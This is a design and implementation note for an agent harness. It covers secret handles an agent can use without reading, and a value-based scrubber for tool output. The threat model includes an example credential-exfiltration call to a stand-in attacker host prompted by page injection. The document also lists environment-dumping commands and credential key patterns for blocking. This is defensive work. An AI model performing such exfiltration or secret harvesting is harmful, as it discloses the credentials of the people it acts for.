# Idea: secrets an agent can use but never read

**Status: idea, not started.** Written down on 2026-09-15 to come back to. Nothing here is built, and the sketch
under [Shape](#shape-a-sketch-unvalidated) is a guess to be argued with, not a design.

## The idea

Let an agent act with my credentials (an API token, a session) without the credential ever entering its context,
its tool results, the run log or an export. The model gets a handle it can pass to the places that need it, and
there is no operation that turns the handle back into the secret.

The browser already has this shape: a WebCrypto `CryptoKey` created with `extractable: false` can sign and decrypt,
and no API will hand you its bytes.

It came out of the read-only `exec` dialect ([`docs/dev/readonly-exec.md`](../dev/readonly-exec.md)), where what a
script can express is already the permission. A secret handle is the same move for authority: what the dialect
cannot say, the model cannot do.

## Threat model first

Hiding the value is the easy half. These are the ways a secret leaks anyway, and a design is only as good as its
answer to each.

1. **Exfiltration by destination.** `send({ auth: handle, url: "https://attacker.example/" })`. If the model chooses
   where the credential goes, it is gone, and a prompt injection on the page is exactly what would ask for that. A
   secret has to be bound to where it may be sent, the way `FETCH_SHEET` is hard-locked to `docs.google.com`.
2. **Reflection.** The legitimate destination sends it back: an endpoint that echoes request headers (httpbin's
   `/headers`), an error saying `invalid token ghp_…`, a debug field. The response lands in the model's context. A
   scrubber can remove the exact value and its common encodings (base64, URL-encoding), but a partial or transformed
   echo gets past it: redaction lowers the rate, it does not close the hole.
3. **Authority, not value.** An agent that cannot read a GitHub token can still delete a repository with it. Hiding
   the value does not limit what the value can do. The grant has to be attenuated: which origin, which methods,
   which paths, perhaps read-only.
4. **The page world.** `window.ml`, the read-only dialect and an approved `exec` all run in the page's main world,
   which a hostile page owns: it can patch `fetch`, read any object reachable from a global, and watch outgoing
   requests. So the secret can never be in the page, not even inside a closure. It stays in the service worker, and
   the request that carries it is made there.
5. **Oracles and side channels.** A response that differs by some property of the secret (its length, a prefix
   match on a lookup endpoint) leaks bits over several calls. Unlikely for bearer tokens, worth a sentence per API.
6. **Forged handles.** If a handle is just a name (`"github"`), the model can write one. That is only safe if the
   authority lives in the run's GRANT rather than in the handle: a forged handle then reaches only what the run was
   already allowed to use.

## Shape (a sketch, unvalidated)

- **Secrets live only in the service worker**, stored when I add them, each with a scope written at the same time:
  exact origins, allowed methods, path prefixes, and where it goes in the request (`Authorization: Bearer …`, a
  header name, a cookie).
- **A run is granted secrets by name**, the way a run is given tools today. The grant is what carries authority; the
  handle the model sees (`ml.secret("github")`) is an empty, frozen, null-prototype object holding no data, so
  `JSON.stringify`, `Object.values`, spread and string coercion have nothing to find.
- **The only sink is a background fetch**: something like `ml.fetch(url, { auth: handle })`. The worker checks the
  URL against the secret's scope, injects the credential, makes the request, scrubs the response, and returns it.
- **Approval** does not fit the dialect's rule, because a request has effects. It needs a third category: an effect
  through a declared, scoped capability. Asked once per run and secret, perhaps, and then free inside the scope.
- **Logs and exports** show the handle as `[secret: github]` and never the value, on every surface, including the
  raw model-facing view AGENTS.md requires.

## How it meets the other specs (2026-10-15)

The idea was written before policies, the effect algebra, the process host and the Python dialect existed on paper. Each
of them has a place for it, and together they answer parts of the threat model above.

- **A secret's scope is a policy.** The origins, methods and path prefixes written when the secret is stored are a
  predicate over a call's resolved facts, attached to the secret and evaluated like any other
  ([`POLICIES.md`](POLICIES.md)); it is the fifth hand-rolled grant store in that spec's table. Attenuation (threat 3)
  is then the same mechanism as every other "decide this without asking": a person narrows a scope the way they narrow
  a policy, on the one page that lists them.
- **In the effect algebra a secret is a resource with one operation.** `use(secret(name))` exists; `read(secret(name))`
  does not, in any vocabulary ([`EFFECTS.md`](EFFECTS.md)). A policy can see that a call carries a secret
  (`c.effects.uses("github")`) and bind it to a destination, which is threat 1 as a set predicate. A file the host flags
  as secret-looking is `read(fs(path))` with `secret: true`, inside no bound at all, the sandbox's included, because
  the harm is disclosure and no enforcer bounds that.
- **Processes are a sink**, and the biggest one ([`SHELL.md`](SHELL.md), "Security invariants"). A script names the
  handle in `env` (`{ GITHUB_TOKEN: ml.secret("github") }`); the policy sees the NAME; the host injects the value at
  spawn, into the environment or a credential helper, only for a program whose manifest may receive that secret.
  Reflection (threat 2) is answered by scrubbing the registered values from a process's output before any script or
  model reads it (`scrubSecrets` in `src/secret-scrub.ts` is the existing form of this, for the backend's own secrets).
  AMENDED 2026-11-17 (the coordinator's call, under ruling 18's order): the scrub sits in the WORKER, not the host, so a
  registered value can pass between the stages of a pipe on the host, and the host's `sha256` and `size` are over the
  raw bytes ("The scrub as built", below). A program whose manifest says it `echoes` its environment is refused with a
  secret present ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)); that refusal lands with the handles slice, since until
  then no secret can reach a process at all. In host mode the person's own credential files and helpers are on disk,
  which the secret path flag and the scrubbed environment are for.
- **A secret lives beside its sink.** The worker holds the ones `ml.fetch` injects; the host holds the ones processes
  need (the OS keychain is the natural store); a handle names a secret wherever it lives, and the grant is evaluated
  where decisions are made, in the worker. The value never travels to a place that only decides.
- **On the wire a handle is a tagged name**, `{ "$secret": "github" }`, and never a value in either direction
  ([`ML_WIRE.md`](ML_WIRE.md)). Threat 6 (forged handles) is answered as the sketch hoped: the authority is the run's
  grant, so a forged name reaches only what the run already had.
- **In the Python dialect a handle is a receiver kind with no attributes and no methods**, whose `repr` is
  `[secret: github]`, passable only to an `ml` member whose manifest lists `use(secret)`
  ([`PYTHON_DIALECT.md`](PYTHON_DIALECT.md)). The persistent namespace holds the handle, never a value, because the
  value never enters any Python process. The JS dialect gets the same kind, and a script that names `ml.secret` never
  runs in the page's main world (threat 4), by the rule that already routes `ml.current` and `ml.sh` to an isolated
  world (`execNames` in `src/sw/exec-routing.ts`).
- **The backend's own URL and key are the built-in secret**, already handled this way: never to a page or the model
  (`src/sw/sw-scrub.ts`), never to a process.

## Scrubbing is by VALUE, in the harness, and says when it fired (2026-10-21)

From an incident on the GPU box the same day (the mlbox session's report): an agent read a container's environment
through a filter it wrote itself, `grep -vi "pass\|key\|token"`, and a live password printed anyway, because it sat in
the VALUE of a variable whose name gives no hint, inside a URL's userinfo (`...=tasmota@http://user:password@host`).
The value was in a gitignored `.env` the whole time. What that fixes in this spec's wording:

- **A denylist of NAMES written by the agent per command is the wrong layer.** Secrets hide in values of harmless keys
  (URLs, DSNs, connection strings, command lines), and a one-off filter under time pressure misses them. The scrub
  belongs between a tool's raw output and anything that reads it (the model, a pipe, a log, an export), and it never
  depends on the agent remembering. `scrubSecrets` already sits there for the backend's own secrets; the rule is that
  it takes a REGISTRY (every value the person marked secret, from a listed `.env`, the keychain, a handle's value) and
  runs on every tool result, file read and process output, matching the value and its obvious encodings (URL-encoded,
  base64, JSON- and shell-escaped). By value there are no false negatives for a known secret.
- **Patterns are the second line, for what nobody registered**: URL userinfo (redact the password, keep the host),
  `Authorization: Bearer|Basic`, the common key shapes (`sk-`, `ghp_`, `AKIA`, a JWT, a PEM block), `password=` and
  `secret=` pairs, a high-entropy token beside a credential word. Lower precision, so a match is replaced with a
  placeholder, never a refused call.
- **Commands that dump an environment are known to the manifest**, which is what `echoes` already says
  ([`PROGRAM_MANIFEST.md`](PROGRAM_MANIFEST.md)): `env`, `printenv`, `set`, `docker inspect`, `docker exec … env`,
  `/proc/*/environ`, `ps e`, `systemctl show -p Environment`, `kubectl get secret`, `git config -l`, a read of a `.env`
  or a credentials file. Refused with a secret present, scrubbed otherwise; a manifest that misses one is a finding.
- **A registered value in a tool's INPUT is flagged too**: the command line is logged as well, so a secret belongs in a
  handle or a temporary env file, never in argv.
- **The output says it was touched**: `[REDACTED:PLUG_PASSWORD]` in place, and "1 secret redacted (PLUG_PASSWORD)"
  appended, name and count only, never the value, so the model does not conclude the value is absent. The check "does
  this output contain secret X" is offered as a count, which is the practice that was already in use by hand.
- **The same scrub runs on persisted transcripts and exports**, so an unregistered secret that slipped through is fixed
  after the fact: register the value, re-scrub what is stored, report which sessions held it, and the person decides
  on rotation.

The test that discriminates: `FOO_SOURCES=a=x@http://u:REALSECRET@10.0.0.1` with `REALSECRET` in a registered `.env`
comes out redacted by value; the same line with it unregistered comes out redacted by the userinfo pattern. Not
built; this is the shape the scrub grows into, recorded so the next builder does not start from a name list. Being
built, 2026-11-17: "The scrub as built", below.

## The scrub as built (2026-11-17)

The order is Shane's (ruling 18: H10, containment, this scrub, H11 to H16, handles last). The worker seat, the
registry's source and the bounds below are the coordinator's calls, 2026-11-17, under that order. Two PRs: the registry
by exact value first, the key-shape patterns second, each pattern on by default only with a false-positive rate measured
on real captured output in its PR.

- **The seat is the worker.** Every text that crosses from the worker into a script or the model passes one scrub,
  [`forModel`](../../src/sw/sw-scrub.ts) extended with the registry:
  - a tool result, at the agent loop's hook ([`agent-loop.ts`](../../src/agent/agent-loop.ts), `deps.forModel`), in
    the worker-hosted loop;
  - a page-started model request, where it leaves the worker for the backend
    ([`background.ts`](../../src/background.ts), `FETCH_LLM` and the stream port, keyed on the sender, never on anything
    the page says): no registered value leaves the worker to a model backend in a page-started request. Every message
    role is scrubbed, the user's included (the page composed all of them), with a bare `[REDACTED]`, no name and no
    count line, so a registered name never reaches the model a page drives, and nothing is reported back to the page: no
    count, no flag, no difference in an answer. This covers the page-hosted loop
    ([`ml-agent-run.ts`](../../src/ml/ml-agent-run.ts)), whose scrub cannot run in the page (threat 4); a page-reachable
    scrub message would be an oracle and does not exist (the coordinator's call, 2026-11-17, under ruling 18's order);
  - the lines the loop appends after that hook (the `@tool:` line, the cut line, the budget line);
  - an `ml.sh` output's head and every `ml.sh.read` range, where they cross from the worker into the script
    ([`sh-call.ts`](../../src/shell/sh-call.ts) `headText`, [`sw-shell-call.ts`](../../src/sw/sw-shell-call.ts)), and
    the run's token store keeps the scrubbed head: a script never holds a registered value, so nothing it returns,
    logs or passes on can carry one. A `python_exec` cell reaches `ml.sh` only over the `ml` wire, whose `sh.run` and
    `sh.read` members call the same two functions ([`sw-ml-wire.ts`](../../src/sw/sw-ml-wire.ts)), so it meets the
    same two crossings and no other;
  - a tool's live output to the sidebar (`streamOutput`, emitted before the hook and kept in the JSON export): the
    text so far, scrubbed whole at each delta, its tail held back as a head's is;
  - a running call's peek tail, which reaches the model through `forModel` already (the task's tail and its stored
    value, [`sw-shell-call.ts`](../../src/sw/sw-shell-call.ts) `peekTail`, and the task messages);
  - a resumed run's history ([`forModelHistory`](../../src/sw/sw-scrub.ts)), so a value registered after a session
    was stored is scrubbed from what a resumed model is sent, though the stored session still holds it;
  - the run log's `key`, which keeps an error's raw text for extension pages: the registry's values are scrubbed from
    it, and the backend's own URL, key and filter stay there as today.
- **The host does not scrub.** A process's held output stays its raw bytes, so a registered value can pass between
  the stages of a pipe on the host (an OS pipe, which never crosses into the worker); it is scrubbed before any script
  or model reads it. `done`'s `sha256` and `size` are over the raw bytes. A scrubbed read says so: a text range comes
  back with its matches replaced, a binary range as scrubbed bytes with `scrubbed: <n>`, and either may be shorter or
  longer than `length`.
- **A cut never lets a prefix through.** A read range is fetched with a margin of the longest registered form on each
  side and scrubbed whole, and a match that overlaps the range is replaced where it overlaps. A head whose last bytes
  are the start of a registered form is cut before them, and its `complete` is false.
- **The registry**, by name and value, is `ml_secret_registry` in `chrome.storage.local` (never sync), declared in the
  state registry beside its store. It is class secret under [`MODEL_SETTINGS.md`](MODEL_SETTINGS.md) ("Not settings,
  never writable"): never in `GET_CONFIG`, `ml.settings()` or an answer to any page-reachable message, never written by
  `change_setting`, and not a key of `MlConfig`. The person adds an entry in the DevTools Settings panel, through a
  message only an extension page may send; the panel gets names and a count back, never a value. The backend's own
  URL, key and model filter stay the built-in entries (`secretsOf`). Bounds, each refused when an entry is added:
  at most 64 entries; a value of 8 to 512 characters (a shorter one would match ordinary text, and the margins and
  the base64 forms grow with a longer one); a NAME matching `[A-Z0-9_]{1,40}`, since it is written into model-facing
  text. `ml_secret_registry` is in no backup, export or archive-folder file (the backup inventory classes it `never`),
  the state inspector shows its names and a count, never a value, and the housekeeping log records a read of the store
  that failed (`secrets`/`registry-unreadable`), with no name and no value.
- **Before the registry is read, no crossing reads it as empty.** The worker starts the read when it starts. A crossing
  that can wait (a tool result, a page-started request, an `ml.sh.read` range) awaits it; one that cannot (a live
  output's delta, the loop's appended lines, the run log's `key`) shows nothing, or a held-back line, until it is done.
  A store that cannot be read fails each waiting crossing closed and is read again by the next one, and a change the
  store reports while the first read is in flight wins over that read.
- **The forms matched** for each value: as written, JSON-escaped, percent-encoded, base64 (standard and URL-safe, at
  each of the three byte alignments a value can take inside a longer base64 run) and shell-escaped (single-quoted with
  `'\''`, and backslash-escaped).
- **The output says it was touched.** Each match becomes `[REDACTED:<NAME>]`, and the tool result ends with one line,
  `1 secret redacted (PLUG_PASSWORD)`, names and a count, never a value. What the run stores and exports is what the
  model saw, so the sidebar (its live output included), the run log and both exports never hold a registered value
  that arrived after it was registered.
- **Known limits**: images; the person's own turn and the page context the run is started with; a value that was
  transformed or only partly echoed (threat 2); a value registered after a session stored it (re-scrubbing stored
  sessions is a later slice); anything a pattern does not know until PR 2; a script or model that already holds a
  guess can confirm it, by echoing the guess and seeing the marker; the model's own tool arguments, which are not
  scrubbed; an approved page that drives a model can confirm a full guess it already holds if the model repeats the
  marker, and learns no name; the page-world tool results of a page-hosted run stay the page's own and are not scrubbed
  for the page; `GET_CONFIG`'s answer to a page is not run through the registry, by design, since what keeps a secret
  out of it is `publicConfig`'s fixed key list (`redteam-lifetimes-config.test.mjs`, #1942, enumerates it, no secret key
  among them), and a public value equal to a registered one reaches the model only through a crossing that scrubs it (a
  page-started request, or a tool result that read the page).
- **Deferred to the handles slice**: reading values from a listed `.env` (a new host message), the keychain, a handle's
  value, and the `echoes` refusal.

## Open questions

- Is per-API scoping bearable to set up, or does it need presets (GitHub read-only, one Google Sheet)?
- Can scrubbing be made good enough for the APIs that matter, or do some APIs have to be marked as echoing and
  refused outright?
- Where does the model's authority stop: can a handle be passed to a server-side tool (OpenWebUI) at all, given
  that the server would then hold it?
- Does this belong in the harness only, or also on the server, for model-provider keys a client should never hold?

## Prior art

- **WebCrypto non-extractable keys**: use without read, enforced by the platform.
- **Object capabilities** (the E language, Mark Miller; SES / Hardened JavaScript): authority carried by unforgeable
  references, attenuated by wrapping them. Sealer/unsealer pairs are close to the handle here.
- **Macaroons**: bearer tokens that carry their own caveats (origin, expiry, path), attenuated by the holder.
- **CI secret masking** (GitHub Actions redacts registered secrets from logs): the redaction half, and a record of
  how often transformed values get past it.
